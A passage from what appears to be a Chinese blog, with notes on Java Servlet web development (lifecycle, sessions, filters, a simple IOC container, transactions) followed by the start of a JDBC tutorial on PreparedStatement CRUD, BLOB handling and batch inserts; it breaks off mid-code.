javax.servlet.http.HttpServlet抽象子类\n相关方法\njavax.servlet.Servlet接口:\n1 2 3 void init(config) - 初始化方法 void service(request,response) - 服务方法 void destory() - 销毁方法 javax.servlet.GenericServlet抽象类：\n1 void service(request,response) - 仍然是抽象的 javax.servlet.http.HttpServlet 抽象子类：\n1 void service(request,response) - 不是抽象的 String method = req.getMethod(); 获取请求的方式\n在HttpServlet这个抽象类中，do方法都差不多:\n1 2 3 4 5 6 7 8 9 protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String protocol = req.getProtocol(); String msg = lStrings.getString(\u0026#34;http.method_get_not_supported\u0026#34;); if (protocol.endsWith(\u0026#34;1.1\u0026#34;)) { resp.sendError(405, msg); } else { resp.sendError(400, msg); } } 小结：\n继承关系： HttpServlet -\u0026gt; GenericServlet -\u0026gt; Servlet Servlet中的核心方法： init() , service() , destroy() 服务方法： 当有请求过来时，service方法会自动响应（其实是tomcat容器调用的） 在HttpServlet中我们会去分析请求的方式：到底是get、post、head还是delete等 然后再决定调用的是哪个do开头的方法 那么在HttpServlet中这些do方法默认都是405的实现风格-要我们子类去实现对应的方法，否则默认会报405错误 因此，我们在新建Servlet时，我们才会去考虑请求方法，从而决定重写哪个do方法 1.2.2 生命周期 Servlet的生命周期\n生命周期：从出生到死亡的过程就是生命周期。对应Servlet中的三个方法：init(),service(),destroy()\n默认情况下：\n第一次接收请求时，这个Servlet会进行实例化(调用构造方法)、初始化(调用init())、然后服务(调用service()) 从第二次请求开始，每一次都是服务 当容器关闭时，其中的所有的servlet实例会被销毁，调用销毁方法 通过案例我们发现：\nServlet实例tomcat只会创建一个，所有的请求都是这个实例去响应。 默认情况下，第一次请求时，tomcat才会去实例化，初始化，然后再服务.这样的好处是提高系统的启动速度 。 这样的缺点是第一次请求时，耗时较长。 因此得出结论： 如果需要提高系统的启动速度，当前默认情况就是这样。如果需要提高响应速度，我们应该设置Servlet的初始化时机。 Servlet在容器中是：单例的、线程不安全的\n单例：所有的请求都是同一个实例去响应 线程不安全：一个线程需要根据这个实例中的某个成员变量值去做逻辑判断。但是在中间某个时机，另一个线程改变了这个成员变量的值，从而导致第一个线程的执行路径发生了变化 我们已经知道了servlet是线程不安全的，给我们的启发是： 尽量的不要在servlet中定义成员变量。如果不得不定义成员变量，那么不要去：①不要去修改成员变量的值 ②不要去根据成员变量的值做一些逻辑判断 1.2.3 session 会话\nHttp是无状态的\nHTTP 无状态 ：服务器无法判断这两次请求是同一个客户端发过来的，还是不同的客户端发过来的\n无状态带来的现实问题：对于多次请求无法确定是一个同一个用户发送，从而增加服务器负载。\n通过会话跟踪技术来解决无状态的问题。\n会话跟踪技术\n客户端第一次发请求给服务器，服务器获取session，获取不到，则创建新的，然后响应给客户端\n下次客户端给服务器发请求时，会把sessionID带给服务器，那么服务器就能获取到了，那么服务器就判断这一次请求和上次某次请求是同一个客户端，从而能够区分开客户端\n常用的API：\n1 2 3 4 5 6 7 8 9 request.getSession() -\u0026gt; 获取当前的会话，没有则创建一个新的会话 request.getSession(true) -\u0026gt; 效果和不带参数相同 request.getSession(false) -\u0026gt; 获取当前会话，没有则返回null，不会创建新的 session.getId() -\u0026gt; 获取sessionID session.isNew() -\u0026gt; 判断当前session是否是新的 session.getMaxInactiveInterval() -\u0026gt; session的非激活间隔时长，默认1800秒 session.setMaxInactiveInterval() session.invalidate() -\u0026gt; 强制性让会话立即失效 session保存作用域\nsession保存作用域是和具体的某一个session对应的\n常用的API：\n1 2 3 void session.setAttribute(k,v) Object session.getAttribute(k) void removeAttribute(k) 作用域比较：\n原始情况下，保存作用域我们可以认为有四个： page（页面级别，现在几乎不用） , request（一次请求响应范围） , session（一次会话范围） , application（整个应用程序范围） request：一次请求响应范围 session：一次会话范围有效 application： 一次应用程序范围有效 1.2.4 网页跳转 服务器内部转发以及客户端重定向 服务器内部转发 : request.getRequestDispatcher(\u0026quot;...\u0026quot;).forward(request,response); 一次请求响应的过程，对于客户端而言，内部经过了多少次转发，客户端是不知道的 地址栏没有变化 客户端重定向： response.sendRedirect(\u0026quot;....\u0026quot;); 两次请求响应的过程。客户端肯定知道请求URL有变化 地址栏有变化 1.2.5 对应网站route设置 可以在web.xml里面配置Servlet\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;Demo01Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.reus.Demo01Servlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;hello\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;world\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;Demo01Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/demo01\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; 可以通过注解的方式进行配置\n1 2 3 4 @WebServlet(urlPatterns = {\u0026#34;/demo01\u0026#34;} , initParams = { @WebInitParam(name=\u0026#34;hello\u0026#34;,value=\u0026#34;world\u0026#34;) }) 这用Demo01Servelet.java对应的service将对应网页的route为/demo01\n获取ServletContext，有很多方法\n在初始化方法中： ServletContxt servletContext = getServletContext()\n在服务方法中也可以通过request对象获取，也可以通过session获取： request.getServletContext(); session.getServletContext()\n获取初始化值：\nservletContext.getInitParameter(); 1.3 Thymeleaf视图技术 Thymeleaf - 视图模板技术\n添加thymeleaf的jar包 新建一个Servlet类ViewBaseServlet 在web.xml文件中添加配置 配置前缀 view-prefix 配置后缀 view-suffix 使得我们的Servlet继承ViewBaseServlet 根据逻辑视图名称 得到 物理视图名称 此处的视图名称是 index\n那么thymeleaf会将这个 逻辑视图名称 对应到 物理视图 名称上去\n逻辑视图名称 ： index\n物理视图名称 ： view-prefix + 逻辑视图名称 + view-suffix\n所以真实的视图名称是： / index .html super.processTemplate(\u0026quot;index\u0026quot;,request,response);\n使用thymeleaf的标签\n1 th:if , th:unless , th:each , th:text , th:src\t,\tth:value th:href 0x02 myssm 2.1 BaseDAO 这里见另一博客 JDBC BaseDAO抽象了基础的增删改查操作API 2.2 IOC IOC\n耦合/依赖\nIOC - 控制反转 / DI - 依赖注入\n控制反转：\n之前在Servlet中，我们创建service对象 ， FruitService fruitService = new FruitServiceImpl(); 这句话如果出现在servlet中的某个方法内部，那么这个fruitService的作用域（生命周期）应该就是这个方法级别； 如果这句话出现在servlet的类中，也就是说fruitService是一个成员变量，那么这个fruitService的作用域（生命周期）应该就是这个servlet实例级别 之后我们在applicationContext.xml中定义了这个fruitService。然后通过解析XML，产生fruitService实例，存放在beanMap中，这个beanMap在一个BeanFactory中 因此，我们转移（改变）了之前的service实例、dao实例等等他们的生命周期。控制权从程序员转移到BeanFactory。这个现象我们称之为控制反转 依赖注入：\n之前我们在控制层出现代码：FruitService fruitService = new FruitServiceImpl()； 那么，控制层和service层存在耦合。\n之后，我们将代码修改成FruitService fruitService = null ; 然后，在配置文件中配置:\n1 2 3 \u0026lt;bean id=\u0026#34;fruit\u0026#34; class=\u0026#34;FruitController\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;fruitService\u0026#34; ref=\u0026#34;fruitService\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; 2.3 Filter Filter也属于Servlet规范\nFilter开发步骤：新建类实现Filter接口，然后实现其中的三个方法：init、doFilter、destroy\n配置Filter，可以用注解@WebFilter，也可以使用xml文件:\n1 \u0026lt;filter\u0026gt; \u0026lt;filter-mapping\u0026gt; Filter在配置时，和servlet一样，也可以配置通配符，例如 @WebFilter(\u0026quot;*.do\u0026quot;)表示拦截所有以.do结尾的请求\n过滤器链\n执行的顺序依次是： A B C demo03 C2 B2 A2 如果采取的是注解的方式进行配置，那么过滤器链的拦截顺序是按照全类名的先后顺序排序的 如果采取的是xml的方式进行配置，那么按照配置的先后顺序进行排序 比如可以实现借助过滤器，设置全局的编码方式，建好代码冗余量。 2.4 事务处理 ThreadLocal\nget() , set(obj)\nThreadLocal称之为本地线程 。 我们可以通过set方法在当前线程上存储数据、通过get方法在当前线程上获取数据\nset方法源码分析：\n1 2 3 4 5 6 7 8 public void set(T value) { Thread t = Thread.currentThread(); //获取当前的线程 ThreadLocalMap map = getMap(t); //每一个线程都维护各自的一个容器（ThreadLocalMap） if (map != null) map.set(this, value); //这里的key对应的是ThreadLocal，因为我们的组件中需要传输（共享）的对象可能会有多个（不止Connection） else createMap(t, value); //默认情况下map是没有初始化的，那么第一次往其中添加数据时，会去初始化 } get方法源码分析：\n1 2 3 4 5 6 7 8 9 10 11 12 13 public T get() { Thread t = Thread.currentThread(); //获取当前的线程 ThreadLocalMap map = getMap(t); //获取和这个线程（企业）相关的ThreadLocalMap（也就是工作纽带的集合） if (map != null) { ThreadLocalMap.Entry e = map.getEntry(this); //this指的是ThreadLocal对象，通过它才能知道是哪一个工作纽带 if (e != null) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) T result = (T)e.value; //entry.value就可以获取到工具箱了 return result; } } return setInitialValue(); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class TransactionManager { public TransactionManager() { } public static void beginTrans() throws SQLException { ConnUtil.getConn().setAutoCommit(false); } public static void commit() throws SQLException { Connection conn = ConnUtil.getConn(); conn.commit(); ConnUtil.closeConn(); } public static void rollback() throws SQLException { Connection conn = ConnUtil.getConn(); conn.rollback(); ConnUtil.closeConn(); } } 借助sql.connection,实现对整个事务的管理，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class TransactionManager { public TransactionManager() { } public static void beginTrans() throws SQLException { ConnUtil.getConn().setAutoCommit(false); } public static void commit() throws SQLException { Connection conn = ConnUtil.getConn(); conn.commit(); ConnUtil.closeConn(); } public static void rollback() throws SQLException { Connection conn = ConnUtil.getConn(); conn.rollback(); ConnUtil.closeConn(); } } 2.5 监听器 监听事件的过程 ServletContextListener - 监听ServletContext对象的创建和销毁的过程 HttpSessionListener - 监听HttpSession对象的创建和销毁的过程 ServletRequestListener - 监听ServletRequest对象的创建和销毁的过程 ServletContextAttributeListener - 监听ServletContext的保存作用域的改动(add,remove,replace) HttpSessionAttributeListener - 监听HttpSession的保存作用域的改动(add,remove,replace) ServletRequestAttributeListener - 监听ServletRequest的保存作用域的改动(add,remove,replace) HttpSessionBindingListener - 监听某个对象在Session域中的创建与移除 HttpSessionActivationListener - 监听某个对象在Session域中的序列化和反序列化 2.6 中央控制器 DispatcherServlet这个类的工作分为两大部分：\n根据url定位到能够处理这个请求的controller组件：\n从url中提取servletPath : 将获得的url进行处理，获得我们在beanFactory中组装好的Controller对象名称。\n根据名称找到对应的组件:xxxController ， 这个对应的依据我们存储在applicationContext.xml中\n1 \u0026lt;bean id=\u0026#34;fruit\u0026#34; class=\u0026#34;com.atguigu.fruit.controllers.FruitController/\u0026gt; 通过DOM技术我们去解析XML文件，在中央控制器中形成一个beanMap容器，用来存放所有的Controller组件\n根据获取到的operate的值定位到我们FruitController中需要调用的方法\n调用Controller组件中的方法：\n获取参数\n获取即将要调用的方法的参数签名信息: Parameter[] parameters = method.getParameters();\n通过parameter.getName()获取参数的名称；\n准备了Object[] parameterValues 这个数组用来存放对应参数的参数值 另外，我们需要考虑参数的类型问题，需要做类型转化的工作。通过parameter.getType()获取参数的类型\n执行方法 Object returnObj = method.invoke(controllerBean , parameterValues);\n视图处理\n1 2 3 4 String returnStr = (String)returnObj; if(returnStr.startWith(\u0026#34;redirect:\u0026#34;)){ .... }else if..... 这里给出applicationContext.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE beans[ \u0026lt;!ELEMENT beans (bean*)\u0026gt; \u0026lt;!ELEMENT bean (property*)\u0026gt; \u0026lt;!ELEMENT property (#PCDATA)\u0026gt; \u0026lt;!ATTLIST bean id ID #REQUIRED\u0026gt; \u0026lt;!ATTLIST bean class CDATA #IMPLIED\u0026gt; \u0026lt;!ATTLIST property name CDATA #IMPLIED\u0026gt; \u0026lt;!ATTLIST property ref IDREF #IMPLIED\u0026gt; ]\u0026gt; \u0026lt;!-- 上面的是 要求了\u0026lt;bean \u0026gt; 和 \u0026lt;property\u0026gt; 的格式--\u0026gt; \u0026lt;beans\u0026gt; \u0026lt;bean id = \u0026#34;userBasicDAO\u0026#34; class = \u0026#34;com.reus.qqzone.dao.impl.UserBasicDAOImpl\u0026#34;/\u0026gt; \u0026lt;bean id = \u0026#34;userBasicService\u0026#34; class = \u0026#34;com.reus.qqzone.service.impl.UserBasicServiceImpl\u0026#34;\u0026gt; \u0026lt;property name = \u0026#34;userBasicDAO\u0026#34; ref=\u0026#34;userBasicDAO\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;!-- user.do --\u0026gt; \u0026lt;bean id = \u0026#34;user\u0026#34; class =\u0026#34;com.reus.qqzone.controller.UserController\u0026#34;\u0026gt; \u0026lt;property name = \u0026#34;userBasicService\u0026#34; ref = \u0026#34;userBasicService\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 0x03 业务 设计业务的时候，需要先构想好数据库、及数据库之间的依赖关系。\nDAO的概念和角色（设计理念）： DAO-称之为数据访问对象，其中的方法都是单精度方法。\n什么叫单精度，单精度指的是这个方法的粒度不能再分了，已经非常细了（因此也称之为细粒度） 什么是业务层\nModel1和Model2 MVC : Model（模型）、View（视图）、Controller（控制器） 视图层：用于做数据展示以及和用户交互的一个界面 控制层：能够接受客户端的请求，具体的业务功能还是需要借助于模型组件来完成 模型层：模型分为很多种：有比较简单的pojo/vo(value object)，有业务模型组件，有数据访问层组件 pojo/vo :类对象 DAO ： 数据访问对象 BO ： 业务对象(这里即为Service) 区分业务对象和数据访问对象： DAO中的方法都是单精度方法或者称之为细粒度方法。什么叫单精度？一个方法只考虑一个操作，比如增删改查 BO中的方法属于业务方法，也实际的业务是比较复杂的，因此业务方法的粒度是比较粗的 针对一个用户的操作：我们可以对用户的登录、注册、查看个人信息、注销、更改信息，这些要求集合成一个controller\ncontroller中调用service 层，在service层实现登录、注册等的业务。 同时呢，service借用dao层的基础数据库为底层。 ","permalink":"http://www.reus09.top/posts/tech/javaweb/","summary":"0x01 Tomcat使用 1.1 Tomcat设置编码 Tomcat设置编码 tomcat8之前，设置编码： get请求方式： get方式目前不需要设置编码（基于","title":"Javaweb"},{"content":"一：JDBC概述 1.1 数据的持久化 持久化(persistence)：把数据保存到可掉电式存储设备中以供之后使用。大多数情况下，特别是企业级应用，数据持久化意味着将内存中的数据保存到硬盘上加以”固化”，而持久化的实现过程大多通过各种关系数据库来完成。\n持久化的主要应用是将内存中的数据存储在关系型数据库中，当然也可以存储在磁盘文件、XML数据文件中。\n1.2 JDBC程序编写步骤 总结一下JDBC建立连接的全过程。 二：获取数据库连接 2.1 Driver接口实现类 2.1.1 Driver接口介绍 java.sql.Driver 接口是所有 JDBC 驱动程序需要实现的接口。这个接口是提供给数据库厂商使用的，不同数据库厂商提供不同的实现。\n在程序中不需要直接去访问实现了 Driver 接口的类，而是由驱动程序管理器类(java.sql.DriverManager)去调用这些Driver实现。\nmySql的驱动：com.mysql.cj.jdbc.Driver ,最新版的驱动已更名为此。 这里讲一下IDEA 如何导入mysql连接库\n打开Project Structure模块\n然后按照如图所示点击，即可添加jar包到项目路径\n2.1.2 加载与注册JDBC驱动 加载驱动：加载 JDBC 驱动需调用 Class 类的静态方法 forName()，向其传递要加载的 JDBC 驱动的类名\nClass.forName(“com.mysql.cj.jdbc.Driver”); 注册驱动：DriverManager 类是驱动程序管理器类，负责管理驱动程序\n使用DriverManager.registerDriver(com.mysql.jc.jdbc.Driver)来注册驱动\n通常不用显式调用 DriverManager 类的 registerDriver() 方法来注册驱动程序类的实例，因为 Driver 接口的驱动程序类都包含了静态代码块，在这个静态代码块中，会调用 DriverManager.registerDriver() 方法来注册自身的一个实例。下图是MySQL的Driver实现类的源码：\n2.2 URL JDBC URL 用于标识一个被注册的驱动程序，驱动程序管理器通过这个 URL 选择正确的驱动程序，从而建立到数据库的连接。\n举例：\n这里注明：在MySQL 8版本以上的url连接需要加上时区\njdbc:mysql://localhost:3306/test?serverTimezone=UTC\n2.4 数据库连接方式 连接方式五 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @Test public void testConnection5() throws Exception { //1.加载配置文件 InputStream is = ConnectionTest.class.getClassLoader().getResourceAsStream(\u0026#34;jdbc.properties\u0026#34;); Properties pros = new Properties(); pros.load(is); //2.读取配置信息 String user = pros.getProperty(\u0026#34;user\u0026#34;); String password = pros.getProperty(\u0026#34;password\u0026#34;); String url = pros.getProperty(\u0026#34;url\u0026#34;); String driverClass = pros.getProperty(\u0026#34;driverClass\u0026#34;); //3.加载驱动 Class.forName(driverClass); //4.获取连接 Connection conn = DriverManager.getConnection(url,user,password); System.out.println(conn); } 其中，配置文件声明在工程的src目录下：jdbc.properties\n1 2 3 4 user=root password=abc123 url=jdbc:mysql://localhost:3306/test?serverTimezone=UTC driverClass=com.mysql.jc.jdbc.Driver 说明：使用配置文件的方式保存配置信息，在代码中加载配置文件\n使用配置文件的好处：\n①实现了代码和数据的分离，如果需要修改配置信息，直接在配置文件中修改，不需要深入代码 ②如果修改了配置信息，省去重新编译的过程。\n三：使用PreparedStatement实现CRUD操作 3.1 操作和访问数据库 数据库连接被用于向数据库服务器发送命令和 SQL 语句，并接受数据库服务器返回的结果。其实一个数据库连接就是一个Socket连接。\n在 java.sql 包中有 3 个接口分别定义了对数据库的调用的不同方式：\nStatement：用于执行静态 SQL 语句并返回它所生成结果的对象。 PrepatedStatement：SQL 语句被预编译并存储在此对象中，可以使用此对象多次高效地执行该语句。 CallableStatement：用于执行 SQL 存储过程 对于 Java 而言，要防范 SQL 注入，只要用 PreparedStatement(从Statement扩展而来) 取代 Statement 就可以了。\n3.2 PreparedStatement的使用 3.2.1 PreparedStatement介绍 PreparedStatement 接口是 Statement 的子接口，它表示一条预编译过的 SQL 语句\nPreparedStatement 对象所代表的 SQL 语句中的参数用问号(?)来表示，调用 PreparedStatement 对象的 setXxx() 方法来设置这些参数. setXxx() 方法有两个参数，第一个参数是要设置的 SQL 语句中的参数的索引(从 1 开始)，第二个是设置的 SQL 语句中的参数的值\n3.2.2 PreparedStatement vs Statement 代码的可读性和可维护性。\nPreparedStatement 能最大可能提高性能：\nDBServer会对预编译语句提供性能优化。因为预编译语句有可能被重复调用，所以语句在被DBServer的编译器编译后的执行代码被缓存下来，那么下次调用时只要是相同的预编译语句就不需要编译，只要将参数直接传入编译过的语句执行代码中就会得到执行。 在statement语句中,即使是相同操作但因为数据内容不一样,所以整个语句本身不能匹配,没有缓存语句的意义.事实是没有数据库会对普通语句编译后的执行代码缓存。这样每执行一次都要对传入的语句编译一次。 (语法检查，语义检查，翻译成二进制命令，缓存) 对于 Java 而言，要防范 SQL 注入，只要用 PreparedStatement(从Statement扩展而来) 取代 Statement 就可以了。\n3.2.3 Java与SQL对应数据类型转换表 Java类型 SQL类型 boolean BIT byte TINYINT short SMALLINT int INTEGER long BIGINT String CHAR,VARCHAR,LONGVARCHAR byte array BINARY , VAR BINARY java.sql.Date DATE java.sql.Time TIME java.sql.Timestamp TIMESTAMP 3.2.4 使用PreparedStatement实现增、删、改操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 //通用的增、删、改操作（体现一：增、删、改 ； 体现二：针对于不同的表） public void update(String sql,Object ... args){ Connection conn = null; PreparedStatement ps = null; try { //1.获取数据库的连接 conn = JDBCUtils.getConnection(); //2.获取PreparedStatement的实例 (或：预编译sql语句) ps = conn.prepareStatement(sql); //3.填充占位符 for(int i = 0;i \u0026lt; args.length;i++){ ps.setObject(i + 1, args[i]); } //4.执行sql语句 ps.execute(); } catch (Exception e) { e.printStackTrace(); }finally{ //5.关闭资源 JDBCUtils.closeResource(conn, ps); } } 3.2.5 使用PreparedStatement实现查询操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 // 通用的针对于不同表的查询:返回一个对象 (version 1.0) public \u0026lt;T\u0026gt; T getInstance(Class\u0026lt;T\u0026gt; clazz, String sql, Object... args) { Connection conn = null; PreparedStatement ps = null; ResultSet rs = null; try { // 1.获取数据库连接 conn = JDBCUtils.getConnection(); // 2.预编译sql语句，得到PreparedStatement对象 ps = conn.prepareStatement(sql); // 3.填充占位符 for (int i = 0; i \u0026lt; args.length; i++) { ps.setObject(i + 1, args[i]); } // 4.执行executeQuery(),得到结果集：ResultSet rs = ps.executeQuery(); // 5.得到结果集的元数据：ResultSetMetaData ResultSetMetaData rsmd = rs.getMetaData(); // 6.1通过ResultSetMetaData得到columnCount,columnLabel；通过ResultSet得到列值 int columnCount = rsmd.getColumnCount(); if (rs.next()) { T t = clazz.newInstance(); for (int i = 0; i \u0026lt; columnCount; i++) {// 遍历每一个列 // 获取列值 Object columnVal = rs.getObject(i + 1); // 获取列的别名:列的别名，使用类的属性名充当 String columnLabel = rsmd.getColumnLabel(i + 1); // 6.2使用反射，给对象的相应属性赋值 Field field = clazz.getDeclaredField(columnLabel); field.setAccessible(true); field.set(t, columnVal); } return t; } } catch (Exception e) { e.printStackTrace(); } finally { // 7.关闭资源 JDBCUtils.closeResource(conn, ps, rs); } return null; } 3.3 ResultSet与ResultSetMetaData 3.3.1 ResultSet 查询需要调用PreparedStatement 的 executeQuery() 方法，查询结果是一个ResultSet 对象\nResultSet 对象以逻辑表格的形式封装了执行数据库操作的结果集，ResultSet 接口由数据库厂商提供实现\nResultSet 返回的实际上就是一张数据表。有一个指针指向数据表的第一条记录的前面。\nResultSet 对象维护了一个指向当前数据行的游标，初始的时候，游标在第一行之前，可以通过 ResultSet 对象的 next() 方法移动到下一行。调用 next()方法检测下一行是否有效。若有效，该方法返回 true，且指针下移。相当于Iterator对象的 hasNext() 和 next() 方法的结合体。\n当指针指向一行时, 可以通过调用 getXxx(int index) 或 getXxx(int columnName) 获取每一列的值。\n例如: getInt(1), getString(\u0026ldquo;name\u0026rdquo;) 注意：Java与数据库交互涉及到的相关Java API中的索引都从1开始。 ResultSet 接口的常用方法：\nboolean next() getString() 3.3.2 ResultSetMetaData 可用于获取关于 ResultSet 对象中列的类型和属性信息的对象\nResultSetMetaData meta = rs.getMetaData();\ngetColumnName(int column)：获取指定列的名称\ngetColumnLabel(int column)：获取指定列的别名\ngetColumnCount()：返回当前 ResultSet 对象中的列数。\ngetColumnTypeName(int column)：检索指定列的数据库特定的类型名称。\ngetColumnDisplaySize(int column)：指示指定列的最大标准宽度，以字符为单位。\nisNullable(int column)：指示指定列中的值是否可以为 null。\nisAutoIncrement(int column)：指示是否自动为指定列进行编号，这样这些列仍然是只读的。\n问题1：得到结果集后, 如何知道该结果集中有哪些列 ？ 列名是什么？\n​ 需要使用一个描述 ResultSet 的对象， 即 ResultSetMetaData\n问题2：关于ResultSetMetaData\n如何获取 ResultSetMetaData： 调用 ResultSet 的 getMetaData() 方法即可 获取 ResultSet 中有多少列：调用 ResultSetMetaData 的 getColumnCount() 方法 获取 ResultSet 每一列的列的别名是什么：调用 ResultSetMetaData 的getColumnLabel() 方法 3.4 资源的释放 数据库结束后一定要关闭所有的连接 3.6 JDBC API小结 两种思想\n面向接口编程的思想 ORM思想(object relational mapping) 一个数据表对应一个java类 表中的一条记录对应java类的一个对象 表中的一个字段对应java类的一个属性 sql是需要结合列名和表的属性名来写。注意起别名。\n两种技术\nJDBC结果集的元数据：ResultSetMetaData 获取列数：getColumnCount() 获取列的别名：getColumnLabel() 通过反射，创建指定类的对象，获取指定的属性并赋值 四： 操作BLOB类型字段 4.1 MySQL BLOB类型 MySQL中，BLOB是一个二进制大型对象，是一个可以存储大量数据的容器，它能容纳不同大小的数据。\n插入BLOB类型的数据必须使用PreparedStatement，因为BLOB类型的数据无法使用字符串拼接写的。\nMySQL的四种BLOB类型(除了在存储的最大信息量上不同外，他们是等同的)\n如果在指定了相关的Blob类型以后，还报错：xxx too large，那么在mysql的安装目录下，找my.ini文件加上如下的配置参数： max_allowed_packet=16M。同时注意：修改了my.ini文件之后，需要重新启动mysql服务。 4.2 向数据表中插入大数据类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //获取连接 Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;insert into customers(name,email,birth,photo)values(?,?,?,?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); // 填充占位符 ps.setString(1, \u0026#34;徐海强\u0026#34;); ps.setString(2, \u0026#34;xhq@126.com\u0026#34;); ps.setDate(3, new Date(new java.util.Date().getTime())); // 操作Blob类型的变量 FileInputStream fis = new FileInputStream(\u0026#34;xhq.png\u0026#34;); ps.setBlob(4, fis); //执行 ps.execute(); fis.close(); JDBCUtils.closeResource(conn, ps); 4.3 修改数据表中的Blob类型字段 1 2 3 4 5 6 7 8 9 10 11 12 13 14 Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;update customers set photo = ? where id = ?\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); // 填充占位符 // 操作Blob类型的变量 FileInputStream fis = new FileInputStream(\u0026#34;coffee.png\u0026#34;); ps.setBlob(1, fis); ps.setInt(2, 25); ps.execute(); fis.close(); JDBCUtils.closeResource(conn, ps); 4.4 从数据表中读取大数据类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 String sql = \u0026#34;SELECT id, name, email, birth, photo FROM customer WHERE id = ?\u0026#34;; conn = getConnection(); ps = conn.prepareStatement(sql); ps.setInt(1, 8); rs = ps.executeQuery(); if(rs.next()){ Integer id = rs.getInt(1); String name = rs.getString(2); String email = rs.getString(3); Date birth = rs.getDate(4); Customer cust = new Customer(id, name, email, birth); System.out.println(cust); //读取Blob类型的字段 Blob photo = rs.getBlob(5); InputStream is = photo.getBinaryStream(); OutputStream os = new FileOutputStream(\u0026#34;c.jpg\u0026#34;); byte [] buffer = new byte[1024]; int len = 0; while((len = is.read(buffer)) != -1){ os.write(buffer, 0, len); } JDBCUtils.closeResource(conn, ps, rs); if(is != null){ is.close(); } if(os != null){ os.close(); } } 五： 批量插入 5.1 批量执行SQL语句 当需要成批插入或者更新记录时，可以采用Java的批量更新机制，这一机制允许多条语句一次性提交给数据库批量处理。通常情况下比单独提交处理更有效率\nJDBC的批量处理语句包括下面三个方法：\naddBatch(String)：添加需要批量处理的SQL语句或是参数； executeBatch()：执行批量处理语句； clearBatch():清空缓存的数据 通常我们会遇到两种批量执行SQL语句的情况：\n多条SQL语句的批量处理； 一个SQL语句的批量传参； 5.2 高效的批量插入 举例：向数据表中插入20000条数据 5.2.1 实现层次一：使用Statement 1 2 3 4 5 6 Connection conn = JDBCUtils.getConnection(); Statement st = conn.createStatement(); for(int i = 1;i \u0026lt;= 20000;i++){ String sql = \u0026#34;insert into goods(name) values(\u0026#39;name_\u0026#39; + \u0026#34;+ i +\u0026#34;)\u0026#34;; st.executeUpdate(sql); } 5.2.2 实现层次二：使用PreparedStatement 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;insert into goods(name)values(?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 20000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); ps.executeUpdate(); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;花费的时间为：\u0026#34; + (end - start));//82340 JDBCUtils.closeResource(conn, ps); 法二比法一快的原因是：PrepareStatement可以给sql提前预备好，实际上，sql只需要拼接一次，而statement需要拼接多次。 5.2.3 实现层次三 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /* * 修改1： 使用 addBatch() / executeBatch() / clearBatch() * 修改2：mysql服务器默认是关闭批处理的，我们需要通过一个参数，让mysql开启批处理的支持。 * ?rewriteBatchedStatements=true 写在配置文件的url后面 * 修改3：使用更新的mysql 驱动：mysql-connector-java-5.1.37-bin.jar * */ @Test public void testInsert1() throws Exception{ long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;insert into goods(name)values(?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 1000000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); //1.“攒”sql ps.addBatch(); if(i % 500 == 0){ //2.执行 ps.executeBatch(); //3.清空 ps.clearBatch(); } } long end = System.currentTimeMillis(); System.out.println(\u0026#34;花费的时间为：\u0026#34; + (end - start));//20000条：625 //1000000条:14733 JDBCUtils.closeResource(conn, ps); } 法三是利用Batch,相当于一个池子，当积累的请求达到一定程度的时候，集中进行执行。 5.2.4 实现层次四 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 /* * 层次四：在层次三的基础上操作 * 使用Connection 的 setAutoCommit(false) / commit() */ @Test public void testInsert2() throws Exception{ long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); 